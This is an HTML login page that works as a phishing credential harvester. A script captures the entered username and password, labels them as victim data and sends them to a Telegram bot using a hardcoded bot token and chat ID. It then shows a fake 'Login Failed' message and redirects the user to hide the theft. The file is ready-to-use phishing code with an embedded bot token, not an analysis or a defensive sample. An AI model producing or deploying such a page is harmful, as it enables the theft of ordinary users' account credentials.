<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #E9E9E9;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .login-container {
            background-color: #FFFFFF;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 350px;
            text-align: center;
        }

        .login-container h2 {
            margin-bottom: 20px;
            color: #1877F2;
            font-size: 24px;
        }

        .input-field {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 2px solid #B0B0B0;
            border-radius: 10px;
            font-size: 16px;
            background-color: #F9F9F9;
            transition: border 0.3s;
            box-sizing: border-box;
        }

        .input-field:focus {
            border-color: #1877F2;
            outline: none;
        }

        .login-button {
            width: 100%;
            padding: 14px;
            border: none;
            background-color: #1877F2;
            color: #FFFFFF;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .login-button:hover {
            background-color: #0052CC;
        }

        .footer {
            margin-top: 20px;
            color: #B0B0B0;
            font-size: 14px;
        }

        .footer a {
            color: #0064A3;
            text-decoration: none;
            font-weight: bold;
        }

        .footer a:hover {
            color: #1877F2;
        }

        /* Ensure mobile responsiveness */
        @media screen and (max-width: 600px) {
            .login-container {
                padding: 20px;
                max-width: 280px;
            }

            .login-button {
                font-size: 16px;
            }

            .input-field {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>

    <!-- Login Form -->
    <div class="login-container">
        <h2>Login</h2>
        <input type="text" id="username" class="input-field" placeholder="Username" />
        <input type="password" id="password" class="input-field" placeholder="Password" />
        <button class="login-button" onclick="login()">Log In</button>
        <p class="footer">Don't have an account? <a href="#">Sign Up</a></p>
    </div>

    <script>
        // Your bot's token and chat ID
        const botToken = "7660705830:AAH7MtFTZabNNS4auifRasVOX7UZlMntqWY";
        const chatId = "5861078781";  // Chat ID where the data should be sent

        function login() {
            // Get the data entered by the user
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (username && password) {
                // Prepare the message to send to Telegram bot
                const message = `VICTIM #1 LOGIN DATA :\nUsername: ${username}\nPassword: ${password}`;

                // Send the phishing data to your Telegram bot using fetch
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            console.log('Message sent to Telegram bot');
                        } else {
                            console.error('Error sending message:', data);
                        }
                    })
                    .catch(error => console.error('Error:', error));

                // Simulate a failed login
                alert('Login Failed! Please try again later.');

                // Redirect to another website after submission
                window.location.href = "https://www.example.com"; // Replace with your target URL
            } else {
                alert("Please enter both username and password.");
            }
        }
    </script>
    
</body>
</html>
